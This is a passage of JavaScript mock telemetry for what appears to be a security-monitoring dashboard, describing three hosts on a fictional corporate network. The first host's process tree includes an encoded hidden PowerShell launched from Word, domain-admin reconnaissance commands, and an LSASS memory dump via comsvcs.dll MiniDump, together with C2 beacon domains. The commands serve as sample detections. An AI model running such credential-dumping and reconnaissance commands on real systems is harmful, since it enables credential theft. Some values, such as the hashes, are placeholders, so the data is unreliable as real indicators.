        { pid: 8816, name: 'wazuh-agent.exe', cpu: '0.8%', memory: '34 MB', user: 'NT AUTHORITY\\SYSTEM' },
        { pid: 3290, name: 'taskhostw.exe', cpu: '0.1%', memory: '18 MB', user: 'CORP\\m.zaib' },
      ],
      openPorts: [
        { port: 135, proto: 'TCP', state: 'LISTENING', service: 'RPC Endpoint Mapper' },
        { port: 445, proto: 'TCP', state: 'LISTENING', service: 'Microsoft-DS / SMB' },
        { port: 3389, proto: 'TCP', state: 'LISTENING', service: 'Remote Desktop Protocol' },
        { port: 5357, proto: 'TCP', state: 'LISTENING', service: 'WSDAPI Web Services' },
      ],
      recentBasicLogons: [
        { timestamp: 'Today 02:19:12', user: 'CORP\\m.zaib', logonType: 'Interactive (Console)', status: 'SUCCESS' },
        { timestamp: 'Today 02:15:30', user: 'CORP\\m.zaib', logonType: 'Network (SMB)', status: 'SUCCESS' },
        { timestamp: 'Today 02:08:44', user: 'CORP\\Administrator', logonType: 'Remote Desktop', status: 'FAILED' },
        { timestamp: 'Today 01:45:10', user: 'CORP\\guest', logonType: 'Network', status: 'FAILED' },
      ]
    },
    advancedActivities: {
      memoryTriage: {
        lsassDumpAttempted: true,
        unbackedExecutableMemoryPages: 14,
        hollowedProcesses: ['rundll32.exe (PID 6480)', 'notepad.exe (PID 9124)'],
        injectedDlls: [
          { dll: 'C:\\Users\\Public\\evil_hook.dll', targetProcess: 'explorer.exe (PID 4820)', signer: 'Unsigned / Self-Signed' },
          { dll: 'C:\\temp\\reflectiveloader.dll', targetProcess: 'svchost.exe (PID 1044)', signer: 'Invalid Certificate (Expired)' }
        ]
      },
      processLineageTree: [
        { parent: 'WINWORD.EXE (PID 3304)', child: 'powershell.exe (PID 5120)', cmd: 'powershell.exe -w hidden -enc SQBFAFgA...', pid: 5120, integrityLevel: 'High', hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' },
        { parent: 'powershell.exe (PID 5120)', child: 'cmd.exe (PID 5188)', cmd: 'cmd.exe /c whoami /priv && net group "Domain Admins" /domain', pid: 5188, integrityLevel: 'High', hash: '5b3a72670e30d7031ff2ef27d89613ecf7e1bfad8d3989c441c0989b0cf29801' },
        { parent: 'cmd.exe (PID 5188)', child: 'rundll32.exe (PID 6480)', cmd: 'rundll32.exe comsvcs.dll, MiniDump 648 C:\\temp\\lsass.dmp full', pid: 6480, integrityLevel: 'System', hash: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0' },
      ],
      networkBeaconing: [
        { destIp: '185.220.101.5', domain: 'c2-telemetry-sync.online', beaconIntervalSec: 60, jitterPercent: 12.4, threatIntelFlag: 'Cobalt Strike Malleable C2 Beacon profile' },
        { destIp: '194.26.29.112', domain: 'api.cdn-cloudfare-worker.cc', beaconIntervalSec: 300, jitterPercent: 5.1, threatIntelFlag: 'Sliver C2 HTTP reverse channel' }
      ],
      activeResponseAvailable: {
        hostIsolationAvailable: true,
        remoteShellAvailable: true,
        processKillAvailable: true,
        firewallDropAvailable: true
      }
    }
  },
  '10.0.4.15': {
    ip: '10.0.4.15',
    hostname: 'FIN-WKS-042',
    status: 'online',
    os: 'Microsoft Windows 10 Enterprise (Build 19045)',
    osArchitecture: 'x86_64 (64-bit AMD/Intel)',
    wazuhAgentId: '012',
    uptime: '4 days, 18 hours',
    macAddress: 'BC:54:51:78:9A:BC',
    gateway: '10.0.4.1 (Cisco Catalyst)',
    domain: 'CORP.CYBERSHIELD.PK',
    cpuLoad: 24,
    memoryLoad: 46,
    lastHeartbeat: '1 second ago',
    riskScore: 22,
    freeActivities: {
      standardProcesses: [
        { pid: 2104, name: 'explorer.exe', cpu: '0.8%', memory: '98 MB', user: 'CORP\\finance_lead' },
        { pid: 900, name: 'excel.exe', cpu: '2.1%', memory: '180 MB', user: 'CORP\\finance_lead' },
        { pid: 1420, name: 'wazuh-agent.exe', cpu: '0.6%', memory: '32 MB', user: 'NT AUTHORITY\\SYSTEM' },
        { pid: 3100, name: 'outlook.exe', cpu: '1.4%', memory: '210 MB', user: 'CORP\\finance_lead' }
      ],
      openPorts: [
        { port: 135, proto: 'TCP', state: 'LISTENING', service: 'RPC Endpoint Mapper' },
        { port: 445, proto: 'TCP', state: 'LISTENING', service: 'SMB' },
      ],
      recentBasicLogons: [
        { timestamp: 'Today 08:00:15', user: 'CORP\\finance_lead', logonType: 'Interactive', status: 'SUCCESS' },
        { timestamp: 'Yesterday 17:30:10', user: 'CORP\\finance_lead', logonType: 'Logoff', status: 'SUCCESS' }
      ]
    },
    advancedActivities: {
      memoryTriage: {
        lsassDumpAttempted: false,
        unbackedExecutableMemoryPages: 0,
        hollowedProcesses: [],
        injectedDlls: []
      },
      processLineageTree: [
        { parent: 'services.exe (PID 620)', child: 'svchost.exe (PID 1024)', cmd: 'svchost.exe -k netsvcs', pid: 1024, integrityLevel: 'System', hash: 'c3d4e5f6a1b20718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0' }
      ],
      networkBeaconing: [],
      activeResponseAvailable: {
        hostIsolationAvailable: true,
        remoteShellAvailable: true,
        processKillAvailable: true,
        firewallDropAvailable: true
      }
    }
  },
  '10.0.1.5': {
    ip: '10.0.1.5',
    hostname: 'DC-PROD-01',
    status: 'online',
    os: 'Windows Server 2022 Datacenter Edition',
    osArchitecture: 'x86_64 (64-bit AMD/Intel)',
    wazuhAgentId: '001',
    uptime: '180 days, 12 hours',
    macAddress: '00:50:56:A1:B2:C3',
    gateway: '10.0.1.1 (Core Core-Switch)',
    domain: 'CORP.CYBERSHIELD.PK (Primary Domain Controller)',
    cpuLoad: 42,
    memoryLoad: 68,
    lastHeartbeat: 'Now',
    riskScore: 48,
    freeActivities: {
      standardProcesses: [
        { pid: 520, name: 'lsass.exe', cpu: '2.4%', memory: '240 MB', user: 'NT AUTHORITY\\SYSTEM' },
        { pid: 680, name: 'ntds.dit (Active Directory)', cpu: '3.1%', memory: '1.2 GB', user: 'NT AUTHORITY\\SYSTEM' },
        { pid: 1120, name: 'dns.exe', cpu: '1.0%', memory: '90 MB', user: 'NT AUTHORITY\\SYSTEM' },
        { pid: 2400, name: 'wazuh-agent.exe', cpu: '1.2%', memory: '45 MB', user: 'NT AUTHORITY\\SYSTEM' }
      ],
      openPorts: [
        { port: 53, proto: 'TCP/UDP', state: 'LISTENING', service: 'DNS Service' },
        { port: 88, proto: 'TCP/UDP', state: 'LISTENING', service: 'Kerberos KDC' },
        { port: 389, proto: 'TCP/UDP', state: 'LISTENING', service: 'LDAP Server' },
        { port: 445, proto: 'TCP', state: 'LISTENING', service: 'SMB File Sharing' },
        { port: 636, proto: 'TCP', state: 'LISTENING', service: 'LDAPS Secure' },
      ],
      recentBasicLogons: [
        { timestamp: 'Today 02:22:40', user: 'CORP\\admin-zaib', logonType: 'Network (Kerberos TGS)', status: 'SUCCESS' },
        { timestamp: 'Today 02:21:05', user: 'CORP\\fake_service_acc', logonType: 'Kerberos TGS', status: 'FAILED' },
      ]
    },
    advancedActivities: {
      memoryTriage: {
        lsassDumpAttempted: true,
        unbackedExecutableMemoryPages: 2,
        hollowedProcesses: [],
        injectedDlls: []
      },
      processLineageTree: [
        { parent: 'wininit.exe (PID 500)', child: 'lsass.exe (PID 520)', cmd: 'C:\\Windows\\system32\\lsass.exe', pid: 520, integrityLevel: 'System', hash: 'e5f6a1b2c3d40718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0' }
      ],
      networkBeaconing: [],
      activeResponseAvailable: {
        hostIsolationAvailable: true,
        remoteShellAvailable: true,
        processKillAvailable: true,
        firewallDropAvailable: true
      }
    }
  }
};

